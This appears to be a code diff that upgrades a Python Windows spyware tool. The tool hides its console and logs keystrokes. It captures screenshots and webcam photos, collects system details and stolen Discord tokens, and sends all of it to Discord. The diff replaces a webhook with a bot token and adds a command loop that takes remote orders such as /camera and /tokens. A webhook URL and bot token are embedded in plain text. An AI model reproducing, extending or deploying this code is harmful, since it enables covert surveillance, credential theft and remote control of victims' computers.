@@ -18,8 +18,33 @@ import shutil
 import ctypes
 from datetime import datetime, timezone
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1520235001881428098/P7NpzBNubCGGy4iPHnwsZUV4XBx_HWrw3NuLy99zm4CPFGbNbPDUYZwaD5WdvO8l3UgQ"
+BOT_TOKEN = "MTUyMDI1NzU5MTA2OTExNDQ0OA.GXP_PE.Vjgfg0B30Puv-3zuFmT_y92HKyIurs0LtAZjLM"
+CHANNEL_ID = None  # Will be set when bot starts
 running = True
+
+def install_missing_modules():
+    """Install required modules if missing"""
+    required_modules = {
+        'cv2': 'opencv-python',
+        'PIL': 'Pillow',
+        'requests': 'requests',
+        'numpy': 'numpy'
+    }
+    
+    for module_name, pip_name in required_modules.items():
+        try:
+            __import__(module_name)
+        except ImportError:
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name, "--quiet", "--disable-pip-version-check"])
+            except:
+                pass
+
+install_missing_modules()
+
+import cv2
+import numpy as np
+from PIL import ImageGrab
 
 class WindowsKeylogger:
     def __init__(self):
@@ -155,35 +180,59 @@ def take_camera_photo():
         pass
     return None
 
-def send_to_webhook(data, file_name):
+def send_discord_message(content, file_bytes=None, filename=None):
+    """Send message to Discord using bot token"""
     try:
+        if file_bytes:
+            files = {'file': (filename, file_bytes, 'image/png')}
+            data = {'content': content}
+            response = requests.post(
+                f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
+                headers={"Authorization": f"Bot {BOT_TOKEN}"},
+                data=data,
+                files=files,
+                timeout=10
+            )
+        else:
+            payload = {"content": content}
+            response = requests.post(
+                f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
+                headers={"Authorization": f"Bot {BOT_TOKEN}"},
+                json=payload,
+                timeout=10
+            )
+        return response.status_code == 200
+    except:
+        return False
+
+def send_to_webhook(data, file_name):
+    """Legacy webhook function - now sends to Discord bot"""
+    try:
+        # Convert to JSON and send as file
         temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
         json.dump(data, temp_file, indent=2, default=str)
         temp_file.close()
         computer_name = socket.gethostname()
         with open(temp_file.name, 'rb') as f:
-            files = {'file': (f"{computer_name}_{file_name}.json", f, 'application/json')}
-            requests.post(WEBHOOK_URL, files=files, timeout=10)
+            content = f.read()
+            send_discord_message(f"📄 {file_name} report", content, f"{computer_name}_{file_name}.json")
         os.remove(temp_file.name)
     except:
         pass
 
-def send_text_to_webhook(text, title):
+def send_text_to_discord(text, title):
+    """Send text message to Discord"""
     try:
         computer_name = socket.gethostname()
-        payload = {
-            "content": f"**{title} - {computer_name}**\n```\n{text[:1900]}\n```"
-        }
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        send_discord_message(f"**{title} - {computer_name}**\n```\n{text[:1900]}\n```")
     except:
         pass
 
-def send_image_to_webhook(image_b64, name):
+def send_image_to_discord(image_b64, name):
+    """Send image to Discord"""
     try:
         img_data = base64.b64decode(image_b64)
-        computer_name = socket.gethostname()
-        files = {'file': (f"{computer_name}_{name}.png", img_data, 'image/png')}
-        requests.post(WEBHOOK_URL, files=files, timeout=10)
+        send_discord_message(f"📸 {name}", img_data, f"{name}.png")
     except:
         pass
 
@@ -332,12 +381,14 @@ def send_initial_report():
     data["screenshot"] = take_screenshot()
     data["camera_photo"] = take_camera_photo()
     
+    # Send full report as JSON
     send_to_webhook(data, "system_report")
     
+    # Send images
     if data.get("screenshot"):
-        send_image_to_webhook(data["screenshot"], "screenshot")
+        send_image_to_discord(data["screenshot"], "screenshot")
     if data.get("camera_photo"):
-        send_image_to_webhook(data["camera_photo"], "camera")
+        send_image_to_discord(data["camera_photo"], "camera")
     
     summary = f"""=== COMPLETE SYSTEM REPORT ===
 Computer: {data['system']['computer_name']}
@@ -356,7 +407,115 @@ Discord Tokens: {len(data.get('discord_tokens', []))}
 Screenshot: {"Taken" if data.get('screenshot') else "Failed"}
 Camera: {"Taken" if data.get('camera_photo') else "Failed"}"""
     
-    requests.post(WEBHOOK_URL, json={"content": f"```\n{summary}\n```"}, timeout=5)
+    send_discord_message(f"```\n{summary}\n```")
+
+def command_handler():
+    """Handle commands from Discord"""
+    global running
+    
+    last_message_id = None
+    
+    while running:
+        try:
+            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
+            params = {"limit": 1}
+            if last_message_id:
+                params["after"] = last_message_id
+            
+            response = requests.get(
+                f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
+                headers=headers,
+                params=params,
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                messages = response.json()
+                for msg in messages:
+                    if msg["author"]["id"] == "1520257591069114448":  # Bot's own ID
+                        continue
+                    
+                    content = msg.get("content", "").strip()
+                    last_message_id = msg["id"]
+                    
+                    if content.lower() == "/screenshot":
+                        screenshot = take_screenshot()
+                        if screenshot:
+                            img_data = base64.b64decode(screenshot)
+                            send_discord_message("📸 Screenshot taken:", img_data, "screenshot.png")
+                        else:
+                            send_discord_message("❌ Failed to take screenshot")
+                    
+                    elif content.lower() == "/camera":
+                        camera = take_camera_photo()
+                        if camera:
+                            img_data = base64.b64decode(camera)
+                            send_discord_message("📷 Camera photo taken:", img_data, "camera.jpg")
+                        else:
+                            send_discord_message("❌ Failed to take camera photo or no camera found")
+                    
+                    elif content.lower() == "/system":
+                        data = get_full_system_report()
+                        summary = f"""=== SYSTEM REPORT ===
+Computer: {data['system']['computer_name']}
+User: {data['system']['username']}
+OS: {data['system']['os']}
+Architecture: {data['system']['architecture']}
+CPU: {data['system']['processor']}
+CPU Cores: {data['system']['cpu_count']}
+IP: {data['network']['ip']}
+External IP: {data['network']['external_ip']}
+Drives: {len(data.get('drives', []))}
+Downloads: {len(data.get('downloads', []))}
+Processes: {len(data.get('processes', []))}
+Installed Software: {len(data.get('installed_software', []))}
+Discord Tokens: {len(data.get('discord_tokens', []))}"""
+                        send_discord_message(f"```\n{summary}\n```")
+                    
+                    elif content.lower() == "/downloads":
+                        data = get_full_system_report()
+                        if data.get("downloads"):
+                            dl_list = "\n".join([f"- {d['name']} ({d['size']} bytes)" for d in data["downloads"][:20]])
+                            send_discord_message(f"📁 Downloads:\n```\n{dl_list}\n```")
+                        else:
+                            send_discord_message("📁 No downloads found")
+                    
+                    elif content.lower() == "/processes":
+                        data = get_full_system_report()
+                        if data.get("processes"):
+                            proc_list = "\n".join([f"- {p['name']} (PID: {p['pid']}) - {p.get('memory_mb', 'N/A')}" for p in data["processes"][:20]])
+                            send_discord_message(f"🔄 Running processes:\n```\n{proc_list}\n```")
+                        else:
+                            send_discord_message("🔄 No processes found")
+                    
+                    elif content.lower() == "/tokens":
+                        data = get_full_system_report()
+                        if data.get("discord_tokens"):
+                            tokens = "\n".join([f"- {t}" for t in data["discord_tokens"]])
+                            send_discord_message(f"🎫 Discord tokens found:\n```\n{tokens}\n```")
+                        else:
+                            send_discord_message("🎫 No Discord tokens found")
+                    
+                    elif content.lower() == "/help":
+                        help_text = """**Available Commands:**
+/screenshot - Take a screenshot
+/camera - Take camera photo
+/system - Show system info
+/downloads - Show downloads folder
+/processes - Show running processes
+/tokens - Show found Discord tokens
+/help - Show this message
+/stop - Stop the bot"""
+                        send_discord_message(help_text)
+                    
+                    elif content.lower() == "/stop":
+                        send_discord_message("🛑 Stopping bot...")
+                        running = False
+                        break
+                        
+        except:
+            pass
+        time.sleep(0.5)
 
 def keylog_loop():
     keylogger = WindowsKeylogger()
@@ -366,7 +525,7 @@ def keylog_loop():
         keys = keylogger.get_buffer()
         if keys:
             computer_name = socket.gethostname()
-            send_text_to_webhook(keys[-3000:], "Keylog Report")
+            send_text_to_discord(keys[-3000:], "Keylog Report")
             data = {
                 "computer": computer_name,
                 "timestamp": datetime.now(timezone.utc).isoformat(),
@@ -374,37 +533,54 @@ def keylog_loop():
             }
             send_to_webhook(data, f"keylog_{int(time.time())}")
 
-def capture_loop():
-    while running:
-        try:
-            screenshot = take_screenshot()
-            if screenshot:
-                send_image_to_webhook(screenshot, f"screenshot_{int(time.time())}")
-            camera = take_camera_photo()
-            if camera:
-                send_image_to_webhook(camera, f"camera_{int(time.time())}")
-        except:
-            pass
-        time.sleep(30)
-
 def main():
-    # Hide console immediately
+    global CHANNEL_ID
     hide_console()
     
-    # Suppress all output
+    # Suppress output
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.devnull, 'w')
+    
+    # Get channel ID from command line or set default
+    if len(sys.argv) > 1:
+        CHANNEL_ID = sys.argv[1]
+    else:
+        # Try to get first available channel
+        try:
+            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
+            response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
+            if response.status_code == 200:
+                guilds = response.json()
+                for guild in guilds:
+                    channels_response = requests.get(
+                        f"https://discord.com/api/v9/guilds/{guild['id']}/channels",
+                        headers=headers,
+                        timeout=5
+                    )
+                    if channels_response.status_code == 200:
+                        channels = channels_response.json()
+                        for channel in channels:
+                            if channel.get("type") == 0:  # Text channel
+                                CHANNEL_ID = channel["id"]
+                                break
+                    if CHANNEL_ID:
+                        break
+        except:
+            pass
+    
+    if not CHANNEL_ID:
+        return
     
     try:
         send_initial_report()
     except:
         pass
     
+    # Start keylogger
     threading.Thread(target=keylog_loop, daemon=True).start()
-    threading.Thread(target=capture_loop, daemon=True).start()
     
-    while running:
-        time.sleep(1)
+    # Start command handler (blocking)
+    command_handler()
 
 if __name__ == "__main__":
     main()
